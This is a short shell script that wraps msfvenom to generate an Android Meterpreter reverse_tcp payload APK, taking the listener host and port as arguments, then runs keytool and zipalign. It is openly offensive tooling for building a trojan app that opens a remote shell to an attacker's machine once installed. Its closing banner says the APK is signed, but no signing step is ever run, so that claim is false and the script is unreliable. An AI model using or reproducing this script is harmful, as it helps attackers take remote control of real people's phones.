#!/bin/sh
red=`tput setaf 1`
Green=`tput setaf 2`
reset=`tput sgr0`
msfvenom -p android/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 R > $3
echo "${Green}[ ✔ ] payload $3......................[ Generated ]"
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias
zipalign -v 4 $3 signed.apk
rm $3
mv signed.apk $3 
echo  "${Green}|==================>DONE <================|"
echo  "${Green}| You have Successfully Generated SIGNED APK |"
echo  "${Green}|==================> FILE <=================|"


